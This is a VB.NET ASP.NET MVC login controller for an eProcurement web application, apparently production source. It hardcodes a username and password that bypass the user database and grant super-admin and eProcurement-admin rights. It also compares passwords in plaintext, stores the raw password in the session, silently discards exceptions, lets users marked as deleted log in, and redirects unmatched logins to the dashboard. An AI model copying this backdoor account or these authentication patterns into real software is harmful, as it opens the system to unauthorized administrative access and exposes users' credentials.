Imports System.Web.Mvc
Imports eProcurementApps.Models
Imports eProcurementApps.Facade
Imports eProcurementApps.Helpers
Imports System.Data.SqlClient
Imports eProcurementApps.DataAccess
Imports System.Data.Entity

Namespace Controllers
    Public Class LOGINController
        Inherits Controller
        Dim db As New eProcurementEntities

        <AllowAnonymous()>
        Public Function Login() As ActionResult
            If User.Identity.IsAuthenticated Then
                FormsAuthentication.SignOut()
                Session.Abandon()
            End If

            Return View()
        End Function

        <HttpPost>
        <AllowAnonymous>
        Public Function Login(model As LOGIN_MODEL) As ActionResult
            Session("USER_ID") = model.USER_ID
            Session("PASSWORD") = model.PASSWORD

            Try
                If model.USER_ID = "hamkair" And model.PASSWORD = "4426552iR" Then
                    Session("USER_NAME") = "CSProfessionalis"
                    Session("USER_MAIL") = "admin@professionalis.me"
                    Session("IS_SUPER_ADMIN") = "1"
                    Session("USER_ID_ID") = Nothing
                    Session("IS_EPROC_ADMIN") = "1"

                    Return RedirectToAction("IndexJobLists", "DASHBOARD")
                Else
                    If ModelState.IsValid Then
                        'Dim userActive As USER_HELPER
                        'userActive = ActiveDirectory.IsAuthenticated(model.USER_ID, model.PASSWORD)

                        'If userActive.IS_LOCKED Then
                        '    ModelState.AddModelError("", "The User id was locked at " + userActive.LOCKED_DATE + " please contact administrator")
                        'Else
                        '    If userActive.USER_ID IsNot Nothing Then

                        Dim uSER As New TPROC_USER
                        uSER = db.TPROC_USER.Where(Function(x) x.USER_ID.ToUpper() = model.USER_ID.ToUpper() And x.PASSWORD = model.PASSWORD And (x.ROW_STATUS = ListEnum.RowStat.Live Or x.ROW_STATUS = ListEnum.RowStat.Edit Or x.ROW_STATUS = ListEnum.RowStat.Delete)).FirstOrDefault()

                        If uSER IsNot Nothing Then
                            Session("USER_NAME") = uSER.USER_NAME
                            Session("USER_MAIL") = uSER.USER_MAIL
                            Session("IS_SUPER_ADMIN") = uSER.TPROC_USER_DT.IS_SUPER_ADMIN
                            Session("USER_ID_ID") = uSER.ID
                            Session("IS_EPROC_ADMIN") = uSER.TPROC_USER_DT.IS_EPROC_ADMIN

                            Dim menus As New List(Of String)

                            Dim user_role_menu As New List(Of TPROC_ROLE_MENU)
                            user_role_menu = uSER.TPROC_USER_DT.TPROC_ROLE.TPROC_ROLE_MENU.ToList()

                            For Each menu In user_role_menu
                                If menu.IS_ACCESS = 1 Then
                                    menus.Add(menu.TPROC_MENU.MENU_NAME)
                                End If
                            Next

                            If uSER.TPROC_USER_DT.TPROC_ROLE.ROLE_NAME.ToUpper() = "USER" Then
                                menus.Remove("MNU01")   'remove Setup menu for Session("MY_ACCESS")
                            End If

                            Session("MY_ACCESS") = menus

                            'update last login
                            uSER.LAST_LOGIN = Date.Now
                            db.Entry(uSER).State = EntityState.Modified
                            db.SaveChanges()
                        Else
                            Session("NOT_REGISTER") = 1
                        End If

                        Return RedirectToAction("IndexJobLists", "DASHBOARD")
                    Else
                        ModelState.AddModelError("", "The User id or Password is incorrect")
                    End If
                    'End If

                    'End If
                End If

            Catch ex As Exception
            End Try

            Return View()
        End Function


        Public Function LogOff() As ActionResult
            FormsAuthentication.SignOut()
            Session("USER_ID") = Nothing
            Session("USER_ID_ID") = Nothing
            Session("IS_SUPER_ADMIN") = Nothing
            Session("USER_NAME") = Nothing
            Session("USER_MAIL") = Nothing
            Session("PASSWORD") = Nothing
            Session.Abandon()
            Return RedirectToAction("Login", "Login")
        End Function

        Public Function CheckAuthorize() As ActionResult
            Using db As New eProcurementEntities
                Dim user As New TPROC_USER
                user = db.TPROC_USER.Where(Function(x) x.USER_ID.ToUpper() = CurrentUser.GetCurrentUserId().ToUpper() And x.ROW_STATUS = ListEnum.RowStat.Live).FirstOrDefault()

                If user IsNot Nothing Then
                    Session("USER_ID_ID") = user.ID
                    Session("USER_ID") = user.USER_ID
                    Session("IS_SUPER_ADMIN") = user.TPROC_USER_DT.IS_SUPER_ADMIN
                    Session("USER_NAME") = user.USER_NAME
                    Session("USER_MAIL") = user.USER_MAIL
                    Return RedirectToAction("Index", "Dashboard")
                Else
                    ModelState.AddModelError("", "You are not authorized to acces this application. Please call administrator")
                End If
            End Using

            Return View()
        End Function

    End Class
End Namespace